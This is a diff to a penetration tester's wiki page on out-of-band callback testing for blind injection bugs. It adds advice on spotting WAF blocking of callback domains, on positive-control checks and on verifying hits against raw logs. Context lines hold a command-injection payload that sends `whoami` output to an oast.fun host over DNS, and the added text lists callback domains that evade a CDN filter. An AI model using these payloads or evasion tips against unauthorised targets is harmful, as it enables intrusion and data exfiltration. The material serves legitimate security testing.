@@ -106,14 +106,56 @@ nslookup `whoami`.<id>.oast.fun
 # blind XXE OOB (external DTD on your HTTP catcher) -> see [[xxe]]
 ```
 
+## The callback domain itself can be blocklisted
+
+Before reading anything into a silent channel, check that the target's CDN/WAF is not
+dropping your payload on the **domain name alone**. Send the bare callback host as a
+parameter value against an endpoint with a known `200` baseline:
+
+```bash
+# baseline, then the bare domain - a 403 here means the channel is dead on this target
+curl -sG -o /dev/null -w '%{http_code}\n' --data-urlencode "q=benign"        https://target/endpoint
+curl -sG -o /dev/null -w '%{http_code}\n' --data-urlencode "q=x.oastify.com" https://target/endpoint
+```
+
+Observed on a Cloudflare-fronted estate: `oastify.com`, `interact.sh` and
+`burpcollaborator.net` are blocked by name, while `oast.fun` / `oast.me` / `oast.pro` /
+`oast.site`, `canarytokens.com`, `requestrepo.com`, `webhook.site`, `dnslog.cn` and
+arbitrary own domains pass. **Burp Collaborator is therefore unusable on some targets**
+regardless of payload - fall back to interactsh or your own domain. This is independent of
+the separate rule that blocks the DNS *verb* (`nslookup`/`curl`/`wget`); see the
+CDN/WAF section in [[wiki/payloads/command-injection]].
+
+## Prove the channel before trusting a negative
+
+A silent listener and a filtered payload look identical. Resolve a positive-control label
+from your own box first and confirm it lands, then treat "no callback" as data:
+
+```bash
+host poscontrol.<your-id>.oast.fun     # must appear in the client / interactions log
+```
+
 ## Discipline
 
 - One unique subdomain per injection point; record which payload used which ID.
 - Stop condition for a blind vector: per the engagement rule, ~30-40 payloads with zero callbacks = exhausted; log to `Deadends.md` and switch vector. Do not grind.
 - No callback != not vulnerable (egress fully filtered), but **no callback = no claim**. Never report a blind bug on timing/inference alone.
 
+## Verify OOB hits against the raw provider log
+
+An automated recon-capture/correlation hook can report a false "OOB HIT" by matching a token-label
+string the tooling itself echoed to stdout, not a real callback from the target. This is only
+caught by checking the interactsh/Collaborator provider's own raw interaction log, which shows no
+matching entry.
+
+For any blind SSRF/XXE/SSTI claim gated on an out-of-band callback: treat an automated correlator's
+"hit" notification as a lead, never as confirmation. Always pull the raw log from the OOB provider
+itself and match timestamp, source IP, and full token before writing up the finding.
+
 ## Sources
 
 - ProjectDiscovery interactsh (slug: interactsh-github) (`https://github.com/projectdiscovery/interactsh`).
 - Canarytokens (slug: canarytokens-docs) (`https://canarytokens.org`).
 - PortSwigger Burp Collaborator (slug: portswigger-collaborator) (`https://portswigger.net/burp/documentation/collaborator`).
+
+<!-- promoted-slug: oob-blind-vulnerability-correlator-tooling-can-self-correlat -->
